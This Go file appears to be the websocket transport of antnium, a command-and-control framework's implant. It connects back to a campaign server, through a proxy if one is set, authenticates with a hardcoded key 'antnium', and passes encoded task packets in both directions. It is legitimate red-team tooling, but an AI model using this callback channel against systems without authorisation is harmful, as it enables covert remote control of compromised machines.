package client

import (
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"strings"

	"github.com/dobin/antnium/pkg/campaign"
	"github.com/dobin/antnium/pkg/common"
	"github.com/dobin/antnium/pkg/model"
	"github.com/gorilla/websocket"
	log "github.com/sirupsen/logrus"
)

// UpstreamWs is a connection to the server via websocket
type UpstreamWs struct {
	chanIncoming chan model.Packet // Provides packets from server to client
	chanOutgoing chan model.Packet // Consumes packets from client to server

	coder    model.Coder
	config   *ClientConfig
	campaign *campaign.Campaign

	wsConn *websocket.Conn // Our active websocket connection
}

func MakeUpstreamWs(config *ClientConfig, campaign *campaign.Campaign) UpstreamWs {
	coder := model.MakeCoder(campaign)

	u := UpstreamWs{
		make(chan model.Packet),
		make(chan model.Packet),
		coder,
		config,
		campaign,
		nil, // no active connection
	}
	return u
}

// Connect creates a WS connection to the server, or returns an error
func (d *UpstreamWs) Connect() error {
	//u := url.URL{Scheme: "ws", Host: *addr, Path: "/echo"}
	myUrl := strings.Replace(d.campaign.ServerUrl, "http", "ws", 1) + d.campaign.ClientWebsocketPath
	var ws *websocket.Conn
	var err error
	proxyUrl, ok := d.campaign.GetProxy()
	if ok {
		parsedUrl, err := url.Parse(proxyUrl)
		if err != nil {
			return fmt.Errorf("Could not parse %s: %s", proxyUrl, err.Error())
		}

		dialer := websocket.Dialer{
			Proxy: http.ProxyURL(parsedUrl),
		}

		ws, _, err = dialer.Dial(myUrl, nil)
		if err != nil {
			return fmt.Errorf("Websocket with proxy %s to %s resulted in %s", proxyUrl, myUrl, err.Error())
		}
	} else {
		ws, _, err = websocket.DefaultDialer.Dial(myUrl, nil)
		if err != nil {
			return fmt.Errorf("Websocket to %s resulted in %s", myUrl, err.Error())
		}
	}

	// Authentication
	authToken := model.ClientWebSocketAuth{
		Key:        "antnium", // d.campaign.ApiKey,
		ComputerId: d.config.ComputerId,
	}
	data, err := json.Marshal(authToken)
	if err != nil {
		return err
	}
	err = ws.WriteMessage(websocket.TextMessage, data)
	if err != nil {
		return err
	}

	d.wsConn = ws

	return nil
}

// Start starts threads responsible to receveive/send packets from the server via WS. lifetime:websocket connection
func (d *UpstreamWs) Start() {
	// Thread: Incoming websocket message reader
	go func() {
		defer d.wsConn.Close()
		for {
			// Get packets (blocking)
			_, message, err := d.wsConn.ReadMessage()
			if err != nil {
				// e.g.: Server quit
				//log.Errorf("WS read error: %s", err.Error())

				// Notify that we are disconnected
				close(d.ChanIncoming()) // Notify UpstreamManager
				close(d.ChanOutgoing()) // Notify ChanOutgoing() thread
				d.Shutdown()
				break // And exit thread
			}

			packet, err := d.coder.DecodeData(message)
			if err != nil {
				log.Error("Could not decode")
				continue
			}
			log.Debugf("Received from server via WS")

			d.ChanIncoming() <- packet
		}
	}()

	// Thread: Outgoing websocket message writer
	go func() {
		for {
			packet, ok := <-d.ChanOutgoing()
			if !ok {
				break
			}

			packetData, err := d.coder.EncodeData(packet)
			if err != nil {
				log.Error("Could not decode")
				return
			}
			common.LogPacketDebug("UpstreamWs:OutgoingThread", packet)

			if d.wsConn == nil {
				log.Infof("WS Outgoing reader: wsConn nil")
				break
			}

			err = d.wsConn.WriteMessage(websocket.TextMessage, packetData)
			if err != nil {
				log.Errorf("WS write error: %s", err.Error())
				//d.Shutdown()
				break
			}
		}
	}()
}

// Connected returns false if we know that that websocket connection is dead
func (d *UpstreamWs) Connected() bool {
	if d.wsConn == nil {
		return false
	} else {
		return true
	}
}

// Shutdown closes the underlying websocket
func (d *UpstreamWs) Shutdown() {
	d.wsConn.Close()
	d.wsConn = nil
}

func (d *UpstreamWs) ChanIncoming() chan model.Packet {
	return d.chanIncoming
}

func (d *UpstreamWs) ChanOutgoing() chan model.Packet {
	return d.chanOutgoing
}
